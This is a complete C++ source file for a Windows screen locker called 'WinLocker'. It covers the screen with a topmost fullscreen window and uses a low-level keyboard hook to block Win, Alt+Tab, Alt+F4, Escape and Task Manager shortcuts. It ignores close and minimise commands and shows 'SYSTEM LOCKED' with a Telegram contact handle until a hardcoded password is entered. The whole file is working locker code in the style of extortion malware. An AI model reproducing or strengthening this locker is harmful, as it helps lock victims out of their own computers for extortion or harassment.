// language: C++, file: locker.cpp, target: Windows 11 x64, MSVC
// WinLocker — fullscreen password lock
// blocks: Alt+F4, Esc, Alt+Tab, Win+*, Ctrl+Shift+Esc
// exits: password "1" or Ctrl+Alt+Del
#include <windows.h>
#include <windowsx.h>
#include <string>

// пароль открытой строкой
const std::wstring PASS = L"1";

std::wstring g_input;
bool g_unlocked = false;
HHOOK g_kbHook = nullptr;

const COLORREF BG     = RGB(0, 0, 0);
const COLORREF FG     = RGB(255, 255, 255);
const COLORREF DIM    = RGB(90, 90, 90);
const COLORREF ACCENT = RGB(200, 30, 30);

LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && !g_unlocked) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;

        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE
            && (GetAsyncKeyState(VK_CONTROL) & 0x8000)
            && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) return 1;
        if (vk == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
    }
    return CallNextHookEx(g_kbHook, code, wp, lp);
}

void DrawTextEx(HDC dc, int x, int y, const wchar_t* s, COLORREF c,
                int size, bool center, int winW) {
    HFONT font = CreateFontW(size, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                             CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                             DEFAULT_PITCH, L"Consolas");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetTextColor(dc, c);
    SetBkMode(dc, TRANSPARENT);
    if (center) {
        SIZE sz;
        GetTextExtentPoint32W(dc, s, (int)wcslen(s), &sz);
        x = (winW - sz.cx) / 2;
    }
    TextOutW(dc, x, y, s, (int)wcslen(s));
    SelectObject(dc, old);
    DeleteObject(font);
}

void Paint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC dc = BeginPaint(hwnd, &ps);
    RECT rc; GetClientRect(hwnd, &rc);

    HBRUSH bg = CreateSolidBrush(BG);
    FillRect(dc, &rc, bg);
    DeleteObject(bg);

    int cx = rc.right / 2;

    DrawTextEx(dc, 0, 180, L"SYSTEM LOCKED", ACCENT, 72, true, rc.right);
    DrawTextEx(dc, 0, 280, L"enter password to continue", DIM, 22, true, rc.right);
    DrawTextEx(dc, 0, 320, L"tg: @werkaramel", ACCENT, 28, true, rc.right);

    RECT box{ cx - 250, 400, cx + 250, 460 };
    HBRUSH bf = CreateSolidBrush(RGB(15, 15, 15));
    FillRect(dc, &box, bf);
    DeleteObject(bf);
    FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));

    std::wstring masked(g_input.size(), L'*');
    DrawTextEx(dc, cx - 230, 418, masked.c_str(), FG, 26, false, 0);

    DrawTextEx(dc, 0, 500, L"[ Enter ]  unlock", DIM, 20, true, rc.right);

    DrawTextEx(dc, 0, 580, L"ctrl+alt+del to force close",
               RGB(50, 50, 50), 16, true, rc.right);

    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: Paint(hwnd); return 0;

    case WM_KEYDOWN:
        if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
        if (wp == VK_ESCAPE) return 0;
        return 0;

    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
        if ((wp & 0xFFF0) == SC_TASKLIST) return 0;
        if ((wp & 0xFFF0) == SC_KEYMENU) return 0;
        return 0;

    case WM_CLOSE:
        return 0;

    case WM_CHAR: {
        if (wp == VK_BACK) {
            if (!g_input.empty()) g_input.pop_back();
        } else if (wp == VK_RETURN) {
            if (g_input == PASS) {
                g_unlocked = true;
                UnhookWindowsHookEx(g_kbHook);
                PostQuitMessage(0);
            } else {
                g_input.clear();
                MessageBeep(MB_ICONHAND);
            }
        } else if (wp >= 32) {
            g_input.push_back((wchar_t)wp);
        }
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    }

    case WM_DESTROY:
        UnhookWindowsHookEx(g_kbHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

int WINAPI wWinMain(HINSTANCE hi, HINSTANCE, PWSTR, int show) {
    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hi;
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"winlocker";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST,
        L"winlocker", L"System Locked",
        WS_POPUP,
        0, 0, sw, sh,
        nullptr, nullptr, hi, nullptr);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook, hi, 0);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
    return 0;
}
